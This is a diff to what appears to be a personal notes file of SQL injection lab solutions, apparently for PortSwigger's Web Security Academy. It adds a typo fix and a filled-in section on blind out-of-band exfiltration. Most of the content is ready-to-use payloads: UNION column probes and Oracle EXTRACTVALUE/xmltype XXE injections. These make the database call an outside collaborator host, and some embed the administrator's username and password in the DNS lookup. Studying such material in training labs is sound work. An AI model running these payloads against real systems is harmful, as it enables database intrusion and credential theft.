@@ -67,7 +67,7 @@ administrator'--
 
 #### SQL injection UNION attack, finding a column containing text
 - define number of columns
-- define wich column is with text
+- define which column is with text
 ```
 '+UNION+SELECT+'a', NULL, NULL--
 '+UNION+SELECT+NULL, 'a', NULL--
@@ -240,8 +240,7 @@ users_*some-random-string*, username_*some-random-string*, password_*some-random
 - use payload from cheatsheet, but craft it accurately using correct concatenation for oracle db
 
 ```
-TrackingId='''||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!
-ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)||'
+TrackingId='''||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)||'
 ```
 - or just scan that point using burp pro then check payload which led to dns interaction:
 ```
@@ -252,6 +251,25 @@ oasti'%7c%7c'fy.com%2f%22%3e%25novwd%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'
 TrackingId='''||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % 
 novwd SYSTEM "http://COLLAB.oasti'||'fy.com/">%novwd;]>'),'/l') from dual)||'
 ```
+or
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
 
 #### Blind SQL injection with out-of-band data exfiltration (OAST)
-TODO
+- take response with trackingId
+- use payload from cheatsheet, but craft it accurately using correct concatenation for oracle db
+- repeat until you get request to collab
+```
+TrackingId='||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote 
+SYSTEM "http://'||(SELECT username||'-'||password FROM users WHERE username='administrator')||'.COLLAB.oastify.com/"> 
+%remote;]>'),'/l') FROM dual)||'
+
+TrackingId='||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!
+ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+username||'-'||password+FROM+users+WHERE+username%3d'administrator')||'.COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)||'
+```
+- scan will show only dns interaction
+or
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
